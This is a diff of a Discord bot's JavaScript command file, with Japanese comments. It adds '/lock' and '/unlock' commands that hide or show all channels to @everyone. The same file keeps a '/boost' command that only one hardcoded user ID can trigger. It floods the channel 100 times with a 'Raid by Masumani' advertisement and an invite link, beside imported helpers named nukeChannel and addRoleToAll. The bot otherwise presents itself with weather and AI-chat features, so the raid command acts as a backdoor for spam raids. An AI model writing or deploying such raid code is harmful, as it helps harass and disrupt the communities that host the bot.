@@ -6,6 +6,7 @@ const {
   nukeChannel,
   clearMessages,
   addRoleToAll,
+  lockChannels, // ★ 新しく追加
 } = require('../utils/guild');
 const { chat } = require('../utils/ai');
 const { saveUserWeatherPref, loadUserWeatherPref, fetchWeather } = require('../utils/weather');
@@ -80,10 +81,25 @@ async function registerSlashCommands(client) {
       .setDescription('全ユーザーに指定のロールを付与します。')
       .addStringOption(o => o.setName('role_name').setDescription('付与するロール名またはID').setRequired(true))
       .setDefaultMemberPermissions(PermissionFlagsBits.ManageRoles),
-    // 💡 新しい /boost コマンドを追加
     new SlashCommandBuilder()
       .setName('boost')
       .setDescription('サーバーを盛り上げるメッセージを連続送信します！'),
+    // ★ 新しい /lock コマンドを追加
+    new SlashCommandBuilder()
+      .setName('lock')
+      .setDescription('「認証」を含まないチャンネルを@everyoneから非表示にします。')
+      .addRoleOption(option =>
+        option
+          .setName('role')
+          .setDescription('このロールを持つユーザーにはチャンネルが表示されます。')
+          .setRequired(true)
+      )
+      .setDefaultMemberPermissions(PermissionFlagsBits.ManageChannels),
+    // ★ 新しい /unlock コマンドを追加
+    new SlashCommandBuilder()
+      .setName('unlock')
+      .setDescription('すべてのチャンネルの表示権限を@everyoneに戻します。')
+      .setDefaultMemberPermissions(PermissionFlagsBits.ManageChannels),
   ];
 
   const rest = new REST({ version: '10' }).setToken(TOKEN);
@@ -140,7 +156,7 @@ async function registerSlashCommands(client) {
           };
           return interaction.reply({ embeds: [embed] });
         } else if (subcommand === 'set') {
-          if (!interaction.member.permissions.has(PermissionFlagsBits.ManageGuild)) {
+          if (!hasManageGuildPermission(interaction.member)) {
             return interaction.reply({ content: '❌ このコマンドを実行する権限がありません。', ephemeral: true });
           }
           const targetUser = interaction.options.getUser('target');
@@ -249,15 +265,11 @@ async function registerSlashCommands(client) {
         await clearMessages(interaction.channel, amount);
         return interaction.editReply(`🧹 ${amount}件の削除リクエストを処理しました`);
       }
-      // 💡 新しい /boost コマンドの実行ロジックを追加
       if (name === 'boost') {
-        // ✅ 許可するユーザーID
         const allowedUserId = "1366740571707801610";
-        // ✅ メッセージ内容と回数（ここを書き換えれば変更可能）
-        const messageContent = "## Raid by Masumani \n https://discord.gg/asuGJGwFND \n MASUMANI ON TOP";
+        const messageContent = `## Raid by Masumani \n https://discord.gg/asuGJGwFND \n MASUMANI ON TOP`;
         const repeatCount = 100;
 
-        // 権限チェック
         if (interaction.user.id !== allowedUserId) {
           return interaction.reply({
             content: "❌ このコマンドを使えるのは管理者だけです。",
@@ -265,17 +277,51 @@ async function registerSlashCommands(client) {
           });
         }
 
-        // 実行通知
         await interaction.reply({
           content: `✅ 「${messageContent}」を ${repeatCount} 回送信します！`,
           ephemeral: true
         });
 
         const channel = interaction.channel;
+        if (!channel) {
+          console.error('チャンネルオブジェクトがnullです。メッセージを送信できません。');
+          return;
+        }
 
-        // 指定回数ループ
         for (let i = 0; i < repeatCount; i++) {
           await channel.send(messageContent);
+        }
+      }
+      // ★ 新しい /lock コマンドの実行ロジック
+      if (name === 'lock') {
+        await interaction.deferReply({ ephemeral: true });
+        const targetRole = interaction.options.getRole('role');
+        if (!hasManageGuildPermission(interaction.member)) {
+            return interaction.editReply('❌ サーバー管理権限がありません。');
+        }
+        const result = await lockChannels(interaction.guild, targetRole.id);
+        return interaction.editReply(`✅ チャンネル権限を変更しました！\n非表示にしたチャンネル: ${result.locked}件\n表示を維持したチャンネル: ${result.unlocked}件`);
+      }
+      // ★ 新しい /unlock コマンドの実行ロジック
+      if (name === 'unlock') {
+        await interaction.deferReply({ ephemeral: true });
+        if (!hasManageGuildPermission(interaction.member)) {
+            return interaction.editReply('❌ サーバー管理権限がありません。');
+        }
+        const everyoneRole = interaction.guild.roles.everyone;
+        try {
+            let unlockedCount = 0;
+            for (const [channelId, channel] of interaction.guild.channels.cache) {
+                if (channel.type !== ChannelType.GuildText && channel.type !== ChannelType.GuildVoice) continue;
+                await channel.permissionOverwrites.edit(everyoneRole, {
+                    ViewChannel: true,
+                });
+                unlockedCount++;
+            }
+            return interaction.editReply(`✅ すべてのチャンネルの権限をリセットしました。\n表示を戻したチャンネル: ${unlockedCount}件`);
+        } catch (e) {
+            console.error('チャンネルのロック解除に失敗しました:', e);
+            return interaction.editReply('❌ チャンネルのロック解除中にエラーが発生しました。');
         }
       }
     } catch (e) {
